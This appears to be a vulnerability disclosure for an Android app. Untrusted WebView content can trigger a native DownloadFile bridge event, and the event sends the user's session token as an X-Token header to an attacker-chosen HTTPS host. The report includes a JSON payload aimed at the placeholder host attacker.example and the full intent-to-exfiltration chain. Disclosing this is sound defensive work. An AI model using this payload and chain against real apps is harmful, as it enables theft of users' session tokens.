# WebView Download Handler Leaks an Active Session Token to an External Host

**Vulnerability:** Sensitive authentication-header disclosure through an untrusted native WebView download action  
**CVSS v3.1:** 7.1 — High (indicative)  
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

## Vulnerability

A malicious application installed on the same Android device can trigger an exported activity with an untrusted URL, loading attacker-controlled HTML in a WebView that exposes `Android.receiveMessage`. The page can invoke the privileged `DownloadFile` event and specify an attacker-controlled HTTPS destination.

The native download handler takes the current session credential from `ISessionManager.getAccessToken()` and attaches it as an `X-Token` HTTP header to a request made to that destination. The first request is a metadata `HEAD`; the subsequent download uses Android `DownloadManager` and performs a `GET` with the same authentication header. The credential therefore leaves the application's trust boundary **before any file needs to be opened**.

## Technical evidence

The injected WebView content sent a bridge event equivalent to:

```json
{
  "event": "DownloadFile",
  "params": {
    "url": "https://attacker.example/test-document.pdf",
    "forceNoPreview": true
  }
}
```

Observed sequence on an Android 13 test device with an authenticated session:

1. A separate local application supplied a controlled `notification_web_url` to the exported activity.
2. The resulting JavaScript document invoked the native `DownloadFile` handler.
3. The handler issued `HEAD` to the controlled HTTPS endpoint with an `X-Token` header sourced from the current mobile session.
4. Android `DownloadManager` subsequently issued `GET` to the same endpoint, again with `X-Token`.
5. Redacted request captures confirmed the header in **both** requests. The token values matched; the original secret value was deliberately excluded from the evidence.

The control-flow chain is:

```text
Untrusted Android Intent
  → attacker-controlled WebView document
  → Android.receiveMessage / DownloadFile
  → ISessionManager.getAccessToken()
  → X-Token added to outbound HEAD and GET
  → attacker-controlled HTTPS endpoint
```

## Confirmed impact

- Exfiltration of the **test account's active mobile authentication token** to a remote HTTPS host controlled by the tester.
- No root privileges, accessibility-service access, or direct access to the target application's private files was needed.
- The same token-bearing header was sent in both the metadata and download requests.

**Limitations:** The token was not replayed against the application's API, and no other account's data was accessed. Session impersonation and downstream account access are potential consequences of exposing a bearer-style authentication token, but were **not independently demonstrated**.

## Root cause

The bridge accepts download URLs supplied by untrusted WebView content, while the native HTTP client unconditionally attaches a sensitive session header to requests for those URLs. Sensitive headers must be limited to validated first-party hosts; untrusted content should not be able to call authenticated native download operations.
